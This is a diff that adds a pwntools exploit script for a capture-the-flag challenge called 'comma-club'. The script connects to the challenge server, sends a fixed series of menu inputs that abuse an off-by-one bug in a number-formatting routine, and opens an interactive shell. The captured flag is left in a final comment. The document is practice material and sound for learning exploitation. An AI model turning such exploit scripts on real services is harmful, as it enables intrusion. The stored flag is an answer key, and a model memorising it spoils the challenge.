@@ -1,0 +1,28 @@
+from pwn import *
+
+# something wrong with print_int_with_commas and print_status func (off by one)
+
+p = remote("comma-club.chal.hackthe.vote", 1337)
+'''
+p = gdb.debug("./challenge_patched", gdbscript = 
+b *print_status + 202
+)
+'''
+e = ELF("./challenge_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+p.sendlineafter(b"> ", b"1")
+for i in range(3):
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", b"584057")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"8")
+p.sendlineafter(b"> ", b"3")
+p.sendlineafter(b"> ", b"2")
+
+p.sendlineafter(b"> ", b"3")
+p.sendlineafter(b"> ", b"Total")
+
+p.interactive()
+#flag{w3lc0me_2_TH3_2_c0mm4_c1ub}
